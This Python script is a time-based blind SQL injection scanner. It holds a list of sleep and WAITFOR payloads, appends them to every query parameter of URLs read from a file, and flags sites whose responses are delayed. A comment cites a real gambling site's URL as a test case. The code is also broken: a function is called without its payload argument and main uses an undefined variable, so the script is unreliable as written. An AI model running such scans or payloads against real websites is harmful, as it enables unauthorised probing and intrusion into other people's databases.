import time

from furl import furl
import aiohttp, asyncio, async_timeout
from log import logger
import sys



#https://stackoverflow.com/questions/57126286/fastest-parallel-requests-in-python

first_time_second = 10
# first_time_second_payload = 12
# second_time_second = 20



_payloads="""
'+(select*from(select(sleep(12)))a)+'
'%2b(select*from(select(sleep(12)))a)%2b'
'||pg_sleep(12)'
+or+sleep(12)
-sleep(12)
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(12)))OR"*/
-sleep/*f*/(12)
1'WAITFOR+DELAY+'0:0:12'
+or+WAITFOR+DELAY+'0:0:12'
""".split('\n')

#https://bingo.paddypower.com/?AFF_ID=8535&ef_id=null& edgecase 
def generateOneTestUrl(url:str,payload:str)->str:
    #https://github.com/gruns/furl
    f =furl(url)
    # print(f)
    for pname, pvalue in f.args.items():
        # print(f"{pname}:  {pvalue}")
        if pname == '' or pvalue is None:
            continue
        f.args[pname] =  pvalue+payload
    return f.url

#dict{testurl:originalurl}
def generateTestUrls(urls:set,payloads:list)->set:
    testurls_rawurls = {}
    for rawurl in urls:
        testurl = generateOneTestUrl(rawurl)
        testurls_rawurls[testurl] = rawurl
    return testurls_rawurls



async def testUrl(session, url,timeout=60):
    start = time.time()
    res = ""
    # SECTION-UNDER-TEST
    try:
        with async_timeout.timeout(timeout):  # TIMEOUT-PROTECTED
            async with session.get(url) as response:
                while True:
                    chunk = await response.content.read(1024)
                    if not chunk:
                        break
                    res += str(chunk)
                await response.release()
    except Exception as e:
        logger.log('INFO', f' Connection to {url} encounter a problem  :  {e}     ')
        pass

    end = time.time()
    runtime = end - start

    return url,runtime

# return:  [('http://www.google.com', 21.05916452407837), ('https://www.example.org', 1.0362162590026855), ('https://stackoverflow.com/', 3.242276668548584), ('https://www.wikipedio.org', 0.8240408897399902)]
async def testUrlWrapper(async_loop, test_urls):
    async with aiohttp.ClientSession(loop=async_loop) as session:
        corou_to_execute = [testUrl(session, url) for url in test_urls]
        results = await asyncio.gather(*corou_to_execute)   #results [('a', 'b'), ('a', 'b'), ('a', 'b')]
        return results

def processResult(results:list):
    url_seconds = {}
    for entry in results:
        if entry[1] > first_time_second :
            url_seconds[entry[0]] = entry[1]
    return url_seconds


def deFalsePositive(url_seconds:dict,testurls_rawurls:dict):
    testurls = url_seconds.keys()
    rawurls = set()
    for testurl in testurls:
        rawurls.add(testurls_rawurls[testurl])

    event_loop = asyncio.get_event_loop()
    results = event_loop.run_until_complete(testUrlWrapper(event_loop, rawurls))

    url_seconds={}
    for result in results:
        if result[1] < first_time_second:
            url_seconds[result[0]] = result[1]
    return url_seconds

def main(urls:set):
    testurls_rawurls = generateTestUrls(urls,_payloads)
    logger.log('INFO', f'Generated  {len(test_urls)} test urls to test for time blind sqli  ')
    

    event_loop = asyncio.get_event_loop()
    results = event_loop.run_until_complete(testUrlWrapper(event_loop, test_urls.keys()))
    url_seconds = processResult(results)
    if url_seconds:
        positive_url_seconds  =  deFalsePositive(url_seconds,testurls_rawurls)
        if positive_url_seconds:
            return positive_url_seconds


if __name__ == '__main__':
    url_file = sys.argv[1]
    with open(url_file,'r') as f:
        urls = set(f.readlines())
        positive_url_seconds = main(urls)
        if positive_url_seconds:
            print(positive_url_seconds)